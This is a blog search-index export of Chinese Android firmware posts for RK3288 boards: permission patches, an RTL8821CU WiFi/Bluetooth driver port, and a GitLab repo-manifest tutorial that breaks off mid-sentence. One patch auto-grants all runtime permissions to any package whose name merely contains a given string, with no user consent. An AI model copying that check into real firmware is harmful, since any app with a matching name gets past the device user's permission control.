<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RK3288 Android 10 系统开发[4] - 提供 app 默认权限</title>
      <link href="2022/07/12/android-perm/"/>
      <url>2022/07/12/android-perm/</url>
      
        <content type="html"><![CDATA[<h2 id="禁用旧版本SDK弹框"><a href="#禁用旧版本SDK弹框" class="headerlink" title="禁用旧版本SDK弹框"></a>禁用旧版本SDK弹框</h2><p>如果在Android10系统上安装旧版本的app，会提示以下信息。</p><blockquote><p>此应用专为旧版 Android 打造，因此可能无法正常运行。请尝试检查更新或与开发者联系。</p></blockquote><span id="more"></span><p>为了去掉这个弹框提示，需要添加以下修改, 将 <code>onStartActivity</code> 函数中的 <code>showDeprecatedTargetDialogIfNeeded</code> 禁用。</p><pre><code class="patch">--- a/services/core/java/com/android/server/wm/AppWarnings.java+++ b/services/core/java/com/android/server/wm/AppWarnings.java@@ -166,7 +166,8 @@ class AppWarnings &#123;     public void onStartActivity(ActivityRecord r) &#123;         showUnsupportedCompileSdkDialogIfNeeded(r);         showUnsupportedDisplaySizeDialogIfNeeded(r);-        showDeprecatedTargetDialogIfNeeded(r);+        //showDeprecatedTargetDialogIfNeeded(r);     &#125;     /**</code></pre><h2 id="安装app默认提供权限"><a href="#安装app默认提供权限" class="headerlink" title="安装app默认提供权限"></a>安装app默认提供权限</h2><p>对于安装app是自动提供的权限，可以添加以下修改。 在 <code>PackageManagerService.java</code> 文件中添加白名单.</p><pre><code class="patch">--- a/services/core/java/com/android/server/pm/PackageManagerService.java+++ b/services/core/java/com/android/server/pm/PackageManagerService.java@@ -1872,7 +1872,8 @@ public class PackageManagerService extends IPackageManager.Stub             // for legacy apps in permission review mode we clear the permission             // review flag which is used to emulate runtime permissions for// legacy apps.-            if (grantPermissions) &#123;+            if (grantPermissions || res.name.contains(&quot;com.customPackage&quot;) || res.name.contains(&quot;com.baidu.input&quot;)) &#123;                 final int callingUid = Binder.getCallingUid();                 mPermissionManager.grantRequestedRuntimePermissions(                        res.pkg, res.newUsers, grantedPermissions, callingUid,</code></pre><h2 id="运行时权限"><a href="#运行时权限" class="headerlink" title="运行时权限"></a>运行时权限</h2><p>对于运行时的权限，在Android10里目前只找到对指定app进行权限配置的方法。以百度输入法为例，添加权限如下。</p><pre><code class="patch">--- a/services/core/java/com/android/server/pm/permission/DefaultPermissionGrantPolicy.java+++ b/services/core/java/com/android/server/pm/permission/DefaultPermissionGrantPolicy.java@@ -744,6 +744,16 @@ public final class DefaultPermissionGrantPolicy &#123;             grantPermissionsToSystemPackage(systemCaptionsServicePackageName, userId,MICROPHONE_PERMISSIONS);         &#125;++        PackageInfo mBaiduPackageInfo = getPackageInfo(&quot;com.baidu.input&quot;);+        if (mBaiduPackageInfo != null &amp;&amp; doesPackageSupportRuntimePermissions(mBaiduPackageInfo)) &#123;+            grantPermissionsToPackage(mBaiduPackageInfo, userId, false, true, true, STORAGE_PERMISSIONS);+            grantPermissionsToPackage(mBaiduPackageInfo, userId, false, true, true, ALWAYS_LOCATION_PERMISSIONS);+            grantPermissionsToPackage(mBaiduPackageInfo, userId, false, true, true, PHONE_PERMISSIONS);+            grantPermissionsToPackage(mBaiduPackageInfo, userId, false, true, true, CONTACTS_PERMISSIONS);+        &#125;     &#125;     private String getDefaultSystemHandlerActivityPackageForCategory(String category, int userId) &#123;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/u010867436/article/details/107223787">高通android10.0默认赋予第三方apk权限</a></li><li><a href="https://blog.csdn.net/wjh8914320/article/details/104613522">[九鼎RK3399Pro] Android 8.1默认自动给APP普通权限</a></li><li><a href="https://www.jianshu.com/p/9dc825ac1c58">应用弹窗“此应用专为旧版Android打造，因此可能无法正常运行...”的原因</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 Android 6.0 适配 RTL8821CU wifi&amp;BT 功能</title>
      <link href="2022/07/08/rk3288-bt/"/>
      <url>2022/07/08/rk3288-bt/</url>
      
        <content type="html"><![CDATA[<h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><p>项目需求，要求添加蓝牙功能，选择的芯片是WIFI&amp;蓝牙二合一的 <code>RTL8821CU</code>.</p><p>为此，需要更新蓝牙和wifi的相关驱动，以及Android系统层的一些配置，同时还要向下兼容旧的wifi芯片 RTL8188EU.</p><h2 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h2><pre><code class="bash"># kernel## configkernel/arch/arm/configs/rockchip_defconfig## dtskernel/arch/arm/boot/dts/rk3288-tb_8846.dts## wifikernel/drivers/net/wireless/rockchip_wlan/rtl8821cu/*kernel/drivers/net/wireless/rockchip_wlan/rtl8821cu/Makefilekernel/drivers/net/wireless/rockchip_wlan/wifi_sys/rkwifi_sys_iface.ckernel/drivers/net/wireless/Kconfigkernel/drivers/net/wireless/Makefilekernel/include/linux/rfkill-wlan.hkernel/net/rfkill/rfkill-wlan.c## btkernel/drivers/bluetooth/rtk_btusb.ckernel/drivers/bluetooth/rtk_btusb.h# vendor## wifivendor/rockchip/common/wifi/modules/8188eu.kovendor/rockchip/common/wifi/modules/8821cu.ko## btvendor/rockchip/common/bluetooth/bluetooth.mkvendor/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/device-rtl.mkvendor/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_configvendor/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_fw## hci toolsvendor/rockchip/common/rftesttool/broadcom/broadcom.mkvendor/rockchip/common/rftesttool/rftesttool.mk# device/rockchip/rk3288device/rockchip/rk3288/init.rc</code></pre><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>在内核配置中启用RTL8821CU.</p><pre><code class="patch">--- a/arch/arm/configs/rockchip_defconfig+++ b/arch/arm/configs/rockchip_defconfig@@ -298,8 +298,9 @@ CONFIG_USB_HSO=y CONFIG_USB_NET_INT51X1=y CONFIG_USB_IPHETH=y CONFIG_USB_SIERRA_NET=y-CONFIG_RTL8188EU=y CONFIG_ESP8089=y+CONFIG_RTL8188EU=m+CONFIG_RTL8821CU=m CONFIG_RKWIFI=y CONFIG_AP6335=y # CONFIG_INPUT_MOUSEDEV is not set</code></pre><h3 id="dts"><a href="#dts" class="headerlink" title="dts"></a>dts</h3><p>在 dts 将wifi_chip_type 改成 RTL8723BU, 注意！是RTL8723BU, 而不是RTL8821CU.</p><p>这一步非常关键，RK3288 android 6.0 sdk默认支持RTL8723BU, 但是还不支持RTL8821CU.也就是说明，安卓系统层只支持RTL8723BU， 而不支持RTL8821CU. 如果不修改，那么蓝牙打开时不会触发驱动层去打开蓝牙。</p><pre><code class="patch">--- a/arch/arm/boot/dts/rk3288-tb_8846.dts+++ b/arch/arm/boot/dts/rk3288-tb_8846.dts@@ -15,8 +15,8 @@ * rtl8188eu, rtl8723bs, rtl8723bu * esp8089 */-//wifi_chip_type = &quot;rtl8723bu&quot;;-wifi_chip_type = &quot;rtl8188eu&quot;;+wifi_chip_type = &quot;rtl8723bu&quot;;+//wifi_chip_type = &quot;rtl8188eu&quot;; sdio_vref = &lt;1800&gt;; //1800mv or 3300mv</code></pre><h3 id="wifi"><a href="#wifi" class="headerlink" title="wifi"></a>wifi</h3><p>wifi 驱动移植相对简单，把RTL8821CU的wifi驱动拷贝到 <code>kernel/drivers/net/wireless/rockchip_wlan/rtl8821cu</code> 目录，然后添加和修改相应的Kconfig, Makefile等即可。</p><pre><code class="patch">diff --git a/drivers/net/wireless/Kconfig b/drivers/net/wireless/Kconfigindex 4e3af3d..5213afe 100644--- a/drivers/net/wireless/Kconfig+++ b/drivers/net/wireless/Kconfig@@ -45,6 +45,7 @@ choice     bool &quot;No Realtek WiFi&quot;  source &quot;drivers/net/wireless/rockchip_wlan/rtl8188eu/Kconfig&quot;+source &quot;drivers/net/wireless/rockchip_wlan/rtl8821cu/Kconfig&quot; source &quot;drivers/net/wireless/rockchip_wlan/rtl8189es/Kconfig&quot; source &quot;drivers/net/wireless/rockchip_wlan/rtl8192cu/Kconfig&quot; source &quot;drivers/net/wireless/rockchip_wlan/rtl8192du/Kconfig&quot;diff --git a/drivers/net/wireless/Makefile b/drivers/net/wireless/Makefileindex c3c8b85..4f18726 100644--- a/drivers/net/wireless/Makefile+++ b/drivers/net/wireless/Makefile@@ -5,6 +5,7 @@ obj-y += rockchip_wlan/wifi_sys/rkwifi_sys_iface.o obj-$(CONFIG_RTL8192CU)        += rockchip_wlan/rtl8192cu/ obj-$(CONFIG_RTL8192DU)        += rockchip_wlan/rtl8192du/ obj-$(CONFIG_RTL8188EU)           += rockchip_wlan/rtl8188eu/+obj-$(CONFIG_RTL8821CU)           += rockchip_wlan/rtl8821cu/ obj-$(CONFIG_RTL8189ES)           += rockchip_wlan/rtl8189es/ obj-$(CONFIG_RTL8723AU)           += rockchip_wlan/rtl8723au/ obj-$(CONFIG_RTL8723BU)           += rockchip_wlan/rtl8723bu/diff --git a/drivers/net/wireless/rockchip_wlan/rtl8821cu/Makefile b/drivers/net/wireless/rockchip_wlan/rtl8821cu/Makefileindex 850fb5a..3a6bacc 100644--- a/drivers/net/wireless/rockchip_wlan/rtl8821cu/Makefile+++ b/drivers/net/wireless/rockchip_wlan/rtl8821cu/Makefile@@ -92,7 +92,7 @@ CONFIG_RTW_UP_MAPPING_RULE = tos CONFIG_RTW_MBO = n ########################## Android ########################### # CONFIG_RTW_ANDROID - 0: no Android, 4/5/6/7/8/9/10/11 : Android version-CONFIG_RTW_ANDROID = 0+CONFIG_RTW_ANDROID = 6  ifeq ($(shell test $(CONFIG_RTW_ANDROID) -gt 0; echo $$?), 0) EXTRA_CFLAGS += -DCONFIG_RTW_ANDROID=$(CONFIG_RTW_ANDROID)@@ -102,7 +102,7 @@ endif CONFIG_RTW_DEBUG = y # default log level is _DRV_INFO_ = 4, # please refer to &quot;How_to_set_driver_debug_log_level.doc&quot; to set the available level.-CONFIG_RTW_LOG_LEVEL = 4+CONFIG_RTW_LOG_LEVEL = 2  # enable /proc/net/rtlxxxx/ debug interfaces CONFIG_PROC_DEBUG = y@@ -135,7 +135,7 @@ CONFIG_LAYER2_ROAMING = y #bit0: ROAM_ON_EXPIRED, #bit1: ROAM_ON_RESUME, #bit2: ROAM_ACTIVE CONFIG_ROAMING_FLAG = 0x3 ###################### Platform Related #######################-CONFIG_PLATFORM_I386_PC = y+CONFIG_PLATFORM_I386_PC = n CONFIG_PLATFORM_ANDROID_X86 = n CONFIG_PLATFORM_ANDROID_INTEL_X86 = n CONFIG_PLATFORM_JB_X86 = n@@ -161,6 +161,7 @@ CONFIG_PLATFORM_ARM_TCC8930_JB42 = n CONFIG_PLATFORM_ARM_RK2818 = n CONFIG_PLATFORM_ARM_RK3066 = n CONFIG_PLATFORM_ARM_RK3188 = n+CONFIG_PLATFORM_ARM_RK3288 = y CONFIG_PLATFORM_ARM_URBETTER = n CONFIG_PLATFORM_ARM_TI_PANDA = n CONFIG_PLATFORM_MIPS_JZ4760 = n@@ -1712,6 +1713,23 @@ KSRC := /home/android_sdk/Rockchip/Rk3188/kernel MODULE_NAME := wlan endif +ifeq ($(CONFIG_PLATFORM_ARM_RK3288), y)+EXTRA_CFLAGS += -DCONFIG_LITTLE_ENDIAN -DCONFIG_PLATFORM_ANDROID -DCONFIG_PLATFORM_ROCKCHIPS+# default setting for Android 4.1, 4.2, 4.3, 4.4+EXTRA_CFLAGS += -DCONFIG_IOCTL_CFG80211 -DRTW_USE_CFG80211_STA_EVENT+EXTRA_CFLAGS += -DCONFIG_CONCURRENT_MODE+# default setting for Power control+EXTRA_CFLAGS += -DRTW_ENABLE_WIFI_CONTROL_FUNC+ifeq ($(CONFIG_SDIO_HCI), y)+EXTRA_CFLAGS += -DRTW_SUPPORT_PLATFORM_SHUTDOWN+endif+# default setting for Special function+ARCH := arm+CROSS_COMPILE := /media/hdd1/wugt/rk3288-android6.0-sdk/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin/arm-eabi-+KSRC := /media/hdd1/wugt/rk3288-android6.0-sdk/kernel+MODULE_NAME := wlan+endif+ ifeq ($(CONFIG_PLATFORM_ARM_RK3066), y) EXTRA_CFLAGS += -DCONFIG_PLATFORM_ARM_RK3066 EXTRA_CFLAGS += -DRTW_ENABLE_WIFI_CONTROL_FUNC</code></pre><p>除了wifi驱动外，还需要更新rfkill驱动。</p><pre><code class="patch">diff --git a/drivers/net/wireless/rockchip_wlan/wifi_sys/rkwifi_sys_iface.c b/drivers/net/wireless/rockchip_wlan/wifi_sys/rkwifi_sys_iface.cindex 58112a9..f7245d6 100755--- a/drivers/net/wireless/rockchip_wlan/wifi_sys/rkwifi_sys_iface.c+++ b/drivers/net/wireless/rockchip_wlan/wifi_sys/rkwifi_sys_iface.c@@ -81,6 +81,11 @@ static ssize_t wifi_chip_read(struct class *cls, struct class_attribute *attr, c            count = sprintf(_buf, &quot;%s&quot;, &quot;RTL8188EU&quot;);            printk(&quot;Current WiFi chip is RTL8188EU.\n&quot;);        &#125;++       if(type == WIFI_RTL8821CU) &#123;+           count = sprintf(_buf, &quot;%s&quot;, &quot;RTL8821CU&quot;);+           printk(&quot;Current WiFi chip is RTL8821CU.\n&quot;);+       &#125;        if(type == WIFI_RTL8723BS) &#123;            count = sprintf(_buf, &quot;%s&quot;, &quot;RTL8723BS&quot;);diff --git a/include/linux/rfkill-wlan.h b/include/linux/rfkill-wlan.hindex 6015bf4..041353f 100755--- a/include/linux/rfkill-wlan.h+++ b/include/linux/rfkill-wlan.h@@ -57,6 +57,7 @@ enum &#123;     WIFI_AP6493,     WIFI_AP6XXX_SERIES,     WIFI_RTL8188EU,+    WIFI_RTL8821CU,     WIFI_RTL8192DU,     WIFI_RTL8723AS,     WIFI_RTL8723BS,diff --git a/net/rfkill/rfkill-wlan.c b/net/rfkill/rfkill-wlan.cindex 55b8b5f..4f5d82c 100755--- a/net/rfkill/rfkill-wlan.c+++ b/net/rfkill/rfkill-wlan.c@@ -126,6 +126,8 @@ int get_wifi_chip_type(void)         type = WIFI_AP6493;     &#125; else if (strcmp(wifi_chip_type_string, &quot;rtl8188eu&quot;) == 0) &#123;         type = WIFI_RTL8188EU;+    &#125; else if (strcmp(wifi_chip_type_string, &quot;rtl8821cu&quot;) == 0) &#123;+        type = WIFI_RTL8821CU;     &#125; else if (strcmp(wifi_chip_type_string, &quot;rtl8192du&quot;) == 0) &#123;         type = WIFI_RTL8192DU;     &#125; else if (strcmp(wifi_chip_type_string, &quot;rtl8723as&quot;) == 0) &#123;</code></pre><h3 id="bt"><a href="#bt" class="headerlink" title="bt"></a>bt</h3><p>接下来是蓝牙驱动，由于sdk默认不支持RTL8821CU, 所以需要手动添加相关配置。</p><pre><code class="patch">--- a/drivers/bluetooth/rtk_btusb.c+++ b/drivers/bluetooth/rtk_btusb.c@@ -70,7 +70,7 @@ #define CMD_HDR_LEN            sizeof(struct hci_command_hdr) #define EVT_HDR_LEN            sizeof(struct hci_event_hdr) #define CMD_CMP_LEN            sizeof(struct hci_ev_cmd_complete)-#define RTK_PATCH_LENGTH_MAX 1024*24+#define RTK_PATCH_LENGTH_MAX 1024*36 static spinlock_t queue_lock; enum rtk_endpoit &#123;@@ -145,6 +145,8 @@ static patch_info fw_patch_table[] = &#123; &#123; 0xb720, 0x8723, 0, 0, &quot;mp_rtl8723b_fw&quot;, &quot;rtl8723b_fw&quot;, &quot;rtl8723bu_config&quot;, NULL, 0 &#125;, /* RTL8723BU */ &#123; 0xb72A, 0x8723, 0, 0, &quot;mp_rtl8723b_fw&quot;, &quot;rtl8723b_fw&quot;, &quot;rtl8723bu_config&quot;, NULL, 0 &#125;, /* RTL8723BU */+&#123; 0xB820, 0x8821, 0, 0, &quot;mp_rtl8821c_fw&quot;, &quot;rtl8821c_fw&quot;, &quot;rtl8821c_config&quot;, NULL, 0 &#125;, /* RTL8821CU */+&#123; 0xC820, 0x8821, 0, 0, &quot;mp_rtl8821c_fw&quot;, &quot;rtl8821c_fw&quot;, &quot;rtl8821c_config&quot;, NULL, 0 &#125;, /* RTL8821CU */ &#123; 0xb728, 0x8723, 0, 0, &quot;mp_rtl8723b_fw&quot;, &quot;rtl8723b_fw&quot;, &quot;rtl8723b_config&quot;, NULL, 0 &#125;, /* RTL8723BE for LC */ &#123; 0xb723, 0x8723, 0, 0, &quot;mp_rtl8723b_fw&quot;, &quot;rtl8723b_fw&quot;, &quot;rtl8723b_config&quot;, NULL, 0 &#125;, /* RTL8723BE */ &#123; 0xb72B, 0x8723, 0, 0, &quot;mp_rtl8723b_fw&quot;, &quot;rtl8723b_fw&quot;, &quot;rtl8723b_config&quot;, NULL, 0 &#125;, /* RTL8723BE */diff --git a/drivers/bluetooth/rtk_btusb.h b/drivers/bluetooth/rtk_btusb.hindex 5f5e53a..f71d7b1 100755--- a/drivers/bluetooth/rtk_btusb.h+++ b/drivers/bluetooth/rtk_btusb.h@@ -127,6 +127,7 @@ struct rtk_bt_vendor_config&#123; #define ROM_LMP_8723a0x1200 #define ROM_LMP_8723b0x8723 #define ROM_LMP_8821a0X8821+#define ROM_LMP_8821c0X8821 #define ROM_LMP_8761a0X8761 #define ROM_LMP_8703a0x8723 #define ROM_LMP_8763a0x8763@@ -149,6 +150,8 @@ uint16_t project_id[] = &#123;     ROM_LMP_8703b,     ROM_LMP_8723c,     ROM_LMP_8822b,+       ROM_LMP_NONE,+       ROM_LMP_8821c,        ROM_LMP_NONE &#125;; struct rtk_eversion_evt &#123;</code></pre><p>值得注意的是：</p><ol><li><code>rtk_usb</code> 驱动配置的最大fw size为24k, 而 RTL8821CU 的 FW 约 30k, 所以需要修改最大值为 36k</li><li>添加 <code>project_id</code> 时，通过debug信息知道 RTL8821CU 对应的 ID 为 10，所以需要修改枚举列表，将 RTL8821CU 放置到第 10 个位置</li><li>通过设置 <code>DBG_FLAG</code> 可以打开调试信息</li></ol><h2 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h2><p>vendor 目录需要添加 RTL8821CU 所需的fw和config文件。</p><pre><code class="patch"> rockchip/common/bluetooth/bluetooth.mk|   1 + rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/device-rtl.mk   |   4 ++++ rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_config | Bin 0 -&gt; 14 bytes rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_fw     | Bin 0 -&gt; 50344 bytes 4 files changed, 5 insertions(+)diff --git a/rockchip/common/bluetooth/bluetooth.mk b/rockchip/common/bluetooth/bluetooth.mkindex 0f6bde8..1dafdcc 100755--- a/rockchip/common/bluetooth/bluetooth.mk+++ b/rockchip/common/bluetooth/bluetooth.mk@@ -12,6 +12,7 @@ $(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/usb/rtl8723b/de $(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/usb/rtl8703b/device-rtl.mk) $(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/usb/rtl8761a/device-rtl.mk) $(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/usb/rtl8821a/device-rtl.mk)+$(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/usb/rtl8821c/device-rtl.mk) $(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/usb/rtl8822b/device-rtl.mk) $(call inherit-product-if-exists, $(LOCAL_PATH)/realtek/firmware/uart/rtlbtfw_cfg.mk)diff --git a/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/device-rtl.mk b/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/device-rtl.mknew file mode 100755index 0000000..440034c--- /dev/null+++ b/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/device-rtl.mk@@ -0,0 +1,4 @@+RTK_BT_FIRMWARE_DIR := rtl8821c+PRODUCT_COPY_FILES += \+       $(LOCAL_PATH)/$(RTK_BT_FIRMWARE_DIR)_fw:system/etc/firmware/rtl8821c_fw \+       $(LOCAL_PATH)/$(RTK_BT_FIRMWARE_DIR)_config:system/etc/firmware/rtl8821c_configdiff --git a/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_config b/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_confignew file mode 100755index 0000000..cbec41eBinary files /dev/null and b/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_config differdiff --git a/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_fw b/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_fwnew file mode 100755index 0000000..bc0df07Binary files /dev/null and b/rockchip/common/bluetooth/realtek/firmware/usb/rtl8821c/rtl8821c_fw differ</code></pre><p>此外，还要把 wifi 驱动 RTL8821CU.ko 放置到 <code>rockchip/common/wifi/modules/</code> 目录。</p><h2 id="hci-tools"><a href="#hci-tools" class="headerlink" title="hci tools"></a>hci tools</h2><p>如果要添加 hci 工具，需要添加以下patch. 这样可以将 hciconfig, hcitool, hcidump 等工具集成到安卓系统。</p><pre><code class="patch">diff --git a/rockchip/common/rftesttool/broadcom/broadcom.mk b/rockchip/common/rftesttool/broadcom/broadcom.mkindex 8819218..4c50604 100644--- a/rockchip/common/rftesttool/broadcom/broadcom.mk+++ b/rockchip/common/rftesttool/broadcom/broadcom.mk@@ -1,8 +1,10 @@+ifneq ($(strip $(TARGET_BOARD_PLATFORM)), rk3288) $(call inherit-product-if-exists, $(LOCAL_PATH)/app/app.mk) MFG_FWS := $(shell ls $(LOCAL_PATH)/mfg) PRODUCT_COPY_FILES += \        $(foreach file, $(MFG_FWS), $(LOCAL_PATH)/mfg/$(file):system/etc/firmware/mfg/$(file))+endif EXE_FILES := $(shell ls $(LOCAL_PATH)/bin) PRODUCT_COPY_FILES += \diff --git a/rockchip/common/rftesttool/rftesttool.mk b/rockchip/common/rftesttool/rftesttool.mkindex bed8945..1012e91 100644--- a/rockchip/common/rftesttool/rftesttool.mk+++ b/rockchip/common/rftesttool/rftesttool.mk@@ -3,4 +3,6 @@ PRODUCT_PACKAGES += \        RFTestTool $(call inherit-product-if-exists, $(LOCAL_PATH)/broadcom/broadcom.mk)+else ifeq ($(strip $(TARGET_BOARD_PLATFORM)), rk3288)+$(call inherit-product-if-exists, $(LOCAL_PATH)/broadcom/broadcom.mk) endif</code></pre><h2 id="init-rc"><a href="#init-rc" class="headerlink" title="init.rc"></a>init.rc</h2><p>最后，在 <code>device/rockchip/rk3288/init.rc</code> 文件中添加wifi驱动加载的指令。</p><pre><code class="patch">diff --git a/init.rc b/init.rcindex 90a0b9e..e4285c3 100644--- a/init.rc+++ b/init.rc@@ -463,6 +463,8 @@ on boot     chown root radio /proc/cmdline     insmod /drmboot.ko+    insmod /system/lib/modules/8188eu.ko+    insmod /system/lib/modules/8821cu.ko     # export power io of extend screen and set the default value     write /sys/class/gpio/export 224 </code></pre><p>以上修改全部完成后，完整编译固件即可打开wifi和蓝牙了。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>wifi驱动需要在kernel目录通过 <code>make modules</code> 得到</li><li>rtk_usb 驱动使能 DBG_FLAG 可以打印更多调试信息</li></ol>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 Android 10 系统开发[3] - 结合 gitlab 搭建 repo 代码仓库管理平台</title>
      <link href="2022/02/24/gitlab-repo/"/>
      <url>2022/02/24/gitlab-repo/</url>
      
        <content type="html"><![CDATA[<p>目前为了本地服务器搭建 <code>gitlab</code> 管理平台，并配合 <code>gerrit</code> 进行代码审查，需要对代码管理重新部署。</p><p>Android 系统使用 <code>repo</code> 管理源码，但是 <code>Android 10</code> 源码包含 <code>732</code> 个仓库，如果在本地 gitlab 服务器和 <code>gerrit</code> 服务器上将所有的仓库都创建一遍的话，仓库太多了， 不便于管理和审查，所以需要重新设计代码结构，并使用 <code>repo</code> 和 <code>manifest</code> 进行管理，为此，我先使用官方 <code>gitlab</code> 搭建了一些测试仓库。用于学习和研究 <code>repo</code> 的代码管理方式。</p><h2 id="gitlab-操作"><a href="#gitlab-操作" class="headerlink" title="gitlab 操作"></a>gitlab 操作</h2><h3 id="新建-group"><a href="#新建-group" class="headerlink" title="新建 group"></a>新建 group</h3><p>首先在 <code>gitlab</code> 上创建一个新的 group，我这里命名为 <code>repo-test</code>, 然后 <code>gitlab</code> 会自动分配一个group链接 &quot;<a href="https://gitlab.com/te3597/&quot;">https://gitlab.com/te3597/&quot;</a></p><h3 id="新建空仓库"><a href="#新建空仓库" class="headerlink" title="新建空仓库"></a>新建空仓库</h3><p>在新建好的 <code>repo-test</code> 组下新建以下空仓库</p><ul><li>git-repo</li><li>manifest</li><li>sdk</li><li>kernel</li><li>uboot</li><li>frameworks_base</li></ul><p>将仓库的克隆路径保存下来</p><pre><code class="bash">https://gitlab.com/te3597/git-repo.githttps://gitlab.com/te3597/manifest.githttps://gitlab.com/te3597/kernel.githttps://gitlab.com/te3597/uboot.githttps://gitlab.com/te3597/frameworks_base.git</code></pre><p><img src="/assets/repo/repo-test.png" alt="repo-test"></p><h2 id="本地代码管理"><a href="#本地代码管理" class="headerlink" title="本地代码管理"></a>本地代码管理</h2><p>前面在 <code>gitlab</code> 上将远程仓库创建好了，本地在创建对应的仓库目录，并初始化仓库，配置好远程仓库。</p><pre><code class="bash">mkdir repo-testcd repo-testfor dir in manifest sdk uboot kernel frameworks_basedo    mkdir $dir; cd $dir; git init; git remote add gitlab https://gitlab.com/te3597/$dir.git; cd -done</code></pre><h3 id="下载-repo"><a href="#下载-repo" class="headerlink" title="下载 repo"></a>下载 repo</h3><p>首先需要下载 <code>repo</code></p><pre><code class="bash">curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod +x ~/bin/repo</code></pre><h3 id="下载-git-repo"><a href="#下载-git-repo" class="headerlink" title="下载 git-repo"></a>下载 git-repo</h3><p>下载 <code>git-repo</code> 是为了方便国内访问，因为 <code>git-repo</code> 服务器在国外无法直接访问。</p><ul><li><a href="https://gerrit.googlesource.com/git-repo/+/stable">https://gerrit.googlesource.com/git-repo/+/stable</a></li></ul><p>以上是<code>git-repo</code> 官方路径，但是国内可能无法直接访问。需要梯子或者使用其它下载源，具体参考博客 <a href="https://www.itmangoto.cn/2018/05/08/git-repo-install/">下载安装和使用git-repo</a>。</p><p>下载完成后，同样放置在 <code>repo-test</code> 目录，这样就把所有仓库目录都准备好了。</p><pre><code>$ lsframeworks_base  git-repo  kernel  manifest  sdk  uboot</code></pre><h3 id="添加代码"><a href="#添加代码" class="headerlink" title="添加代码"></a>添加代码</h3><p>在处理 <code>git-repo</code>, <code>manifest</code> 外的其它仓库时，添加一些文件，或者目录，然后提交一次commit，并将代码推送到 <code>gitlab</code>, 以 <code>kernel</code> 目录为例。</p><pre><code class="bash">cd kerneltouch REAMDEecho test &gt; READMEgit add .git commit -m &quot;init commit&quot;git push gitlab master</code></pre><p>针对 <code>git-repo</code>, 需要添加一个新的remote，并推送上去。</p><pre><code class="bash">cd git-repogit remote add gitlab https://gitlab.com/te3597/git-repo.gitgit checkout -b mastergit tag v1.0.0git push gitlab master</code></pre><h2 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h2><p><code>repo</code> 需要使用 <code>*.xml</code> 文件管理所有仓库目录，用以确定各个仓库的<strong>下载路径</strong>和<strong>本地部署路径</strong>, 这个 <code>xml</code> 文件可以单独存放在 <code>manifest</code> 仓库中。</p><p>针对当前测试项目，编写的 <code>test.xml</code> 如下：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;manifest&gt;  &lt;notice&gt;DO NOT MODIFY!!!! THIS IS A BRANCH MANIFEST&lt;/notice&gt;  &lt;remote fetch=&quot;https://gitlab.com/&quot;  name=&quot;gitlab&quot; review=&quot;null&quot;/&gt;  &lt;default remote=&quot;gitlab&quot; revision=&quot;master&quot;/&gt;  &lt;project name=&quot;te3597/uboot&quot;                 path=&quot;u-boot&quot;               remote=&quot;gitlab&quot;   revision=&quot;master&quot;/&gt;  &lt;project name=&quot;te3597/kernel&quot;                path=&quot;kernel&quot;               remote=&quot;gitlab&quot;   revision=&quot;master&quot;/&gt;  &lt;project name=&quot;te3597/sdk&quot;                   path=&quot;.&quot;                    remote=&quot;gitlab&quot;   revision=&quot;master&quot;/&gt;  &lt;project name=&quot;te3597/frameworks_base&quot;       path=&quot;frameworks/base&quot;      remote=&quot;gitlab&quot;   revision=&quot;master&quot;/&gt;&lt;/manifest&gt;</code></pre><p>可以看到其中主要用到4种节点。</p><pre><code>notice: 注意信息remote: 远程仓库链接，名称等信息；可以包含多个 &lt;remote&gt; 节点default: 仓库默认的remote，与 &lt;remote&gt; 节点对应；以及默认分支，这里是“master”project: 仓库信息，包含name:名称，path: 本地部署路径，remote:远程服务器，revision:分支</code></pre><p>在使用 <code>repo sync</code> 同步代码时，每个仓库的链接组成如下：</p><pre><code class="bash">&lt;remote-fetch&gt;/&lt;project-name&gt;# examples: ubootremote-fetch: &quot;https://gitlab.com&quot;project-name:  &quot;te3597/uboot&quot;project-url: &quot;https://gitlab.com/te3597/uboot&quot;</code></pre><p>当 <code>repo sync</code> 